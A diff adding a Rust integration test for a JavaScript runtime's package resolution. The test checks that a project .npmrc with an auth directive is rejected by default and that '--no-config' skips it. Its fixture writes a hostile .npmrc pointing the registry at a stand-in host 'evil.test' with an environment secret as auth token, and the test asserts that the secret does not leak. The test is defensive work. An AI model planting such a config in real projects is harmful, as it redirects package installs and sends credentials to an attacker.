@@ -4739,6 +4739,83 @@ console.log(`${a}:${b}`);
     }
 
     #[test]
+    fn no_config_skips_project_npmrc_and_default_rejects_project_npmrc_auth() {
+        let xdg_cache = TempDir::new().unwrap();
+        let home = TempDir::new().unwrap();
+        let cas = CasStore::new(xdg_cache.path().join("vaeljs").join("packages"));
+        let (sri, tree) = seed_package(
+            &cas,
+            r#"{"name":"cached-pkg","version":"1.0.0","type":"module","exports":"./index.mjs"}"#,
+            &[("index.mjs", "export const ok = 'from-cas';\n")],
+        );
+
+        let project = Project::new();
+        let mut lock = Lockfile::new();
+        lock.specifiers.insert(
+            "cached-pkg@^1.0.0".to_owned(),
+            "cached-pkg@1.0.0".to_owned(),
+        );
+        lock.packages.insert(
+            "cached-pkg@1.0.0".to_owned(),
+            LockedPackage {
+                version: "1.0.0".to_owned(),
+                integrity: sri,
+                tree_sha256: Some(tree),
+                tarball_url: "https://registry.npmjs.org/cached-pkg/-/1.0.0.tgz".to_owned(),
+                dependencies: BTreeMap::new(),
+            },
+        );
+        lock.write_atomic(&project.path("vael.lock")).unwrap();
+        project.write(
+            ".npmrc",
+            "registry=https://evil.test/\n//evil.test/:_authToken=${VAEL_SECRET_SENTINEL}\n",
+        );
+        let main = project.write(
+            "main.mjs",
+            "import { ok } from 'npm:cached-pkg@^1.0.0'; console.log(ok);\n",
+        );
+
+        // Default discovery reads project .npmrc and rejects auth/env directive.
+        let blocked = vaeljs_command()
+            .env("HOME", home.path())
+            .env("XDG_CACHE_HOME", xdg_cache.path())
+            .env("VAEL_SECRET_SENTINEL", "top_secret_token")
+            .args(["--offline", "--frozen-lockfile"])
+            .arg(&main)
+            .output()
+            .expect("spawn vaeljs");
+        assert_eq!(
+            blocked.status.code(),
+            Some(1),
+            "stderr: {}",
+            stderr(&blocked)
+        );
+        assert!(
+            stderr(&blocked).contains("project .npmrc"),
+            "stderr: {}",
+            stderr(&blocked)
+        );
+        assert!(!stderr(&blocked).contains("top_secret_token"));
+
+        // `--no-config` skips project .npmrc discovery and resolves via lockfile + CAS.
+        let skipped = vaeljs_command()
+            .env("HOME", home.path())
+            .env("XDG_CACHE_HOME", xdg_cache.path())
+            .env("VAEL_SECRET_SENTINEL", "top_secret_token")
+            .args(["--no-config", "--offline", "--frozen-lockfile"])
+            .arg(&main)
+            .output()
+            .expect("spawn vaeljs --no-config");
+        assert_eq!(
+            skipped.status.code(),
+            Some(0),
+            "stderr: {}",
+            stderr(&skipped)
+        );
+        assert_eq!(stdout(&skipped), "from-cas\n");
+    }
+
+    #[test]
     fn ancestor_import_map_resolves_npm_and_gates_remote_schemes_in_run_and_test() {
         use sha2::Sha256;
         use std::collections::HashMap;
